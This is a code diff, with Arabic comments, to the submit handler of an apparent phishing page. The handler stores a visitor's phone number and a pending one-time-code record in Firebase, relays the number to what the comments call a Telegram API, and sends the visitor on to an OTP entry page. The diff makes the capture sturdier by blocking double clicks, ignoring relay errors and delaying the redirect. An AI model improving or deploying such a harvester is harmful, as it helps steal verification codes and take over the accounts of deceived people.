@@ -126,31 +126,41 @@
     submitBtn.addEventListener('click', async () => {
         if (!submitBtn.disabled) {
             const phone = phoneInput.value;
-            localStorage.setItem('userPhone', phone);
+            
+            // تغيير حالة الزر لمنع الضغط المتكرر
+            submitBtn.innerText = "جاري المعالجة...";
+            submitBtn.disabled = true;
 
             try {
-                // 1. الحفظ في Firebase مع إضافة حالة "pending" و استخراج الـ ID
+                // 1. الحفظ في Firebase
                 const docRef = await addDoc(collection(db, "users"), {
                     phone: phone,
                     otp: "بانتظار الرمز...",
-                    status: "pending", // هذه الحالة ضرورية للمراقبة
+                    status: "pending", 
                     timestamp: serverTimestamp()
                 });
                 
-                // 2. حفظ الـ ID الخاص بالمستخدم في المتصفح لاستخدامه في صفحة OTP
+                // 2. حفظ الـ ID والـ Phone
                 localStorage.setItem('currentDocId', docRef.id);
-
-                // 3. الإرسال للـ API الخاص بالتليجرام
+                localStorage.setItem('userPhone', phone);
+                
+                // 3. الإرسال للـ API الخاص بالتليجرام (اختياري)
                 fetch('/api/send', {
-                    method: 'POST',
+                    method: 'POST', 
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phone, otp: "بدأ التسجيل" })
-                });
+                    body: JSON.stringify({ phone: phone, otp: "بدأ التسجيل" }) 
+                }).catch(() => {}); // نتجاهل أخطاء الـ API لضمان الانتقال
 
-                window.location.href = 'otp.html';
+                // 4. تأخير الانتقال لضمان حفظ الـ localStorage
+                setTimeout(() => {
+                    window.location.href = 'otp.html';
+                }, 300);
+
             } catch (error) {
                 console.error("Error:", error);
-                window.location.href = 'otp.html';
+                alert("حدث خطأ أثناء الاتصال، يرجى المحاولة مرة أخرى.");
+                submitBtn.innerText = "استمرار";
+                submitBtn.disabled = false;
             }
         }
     });
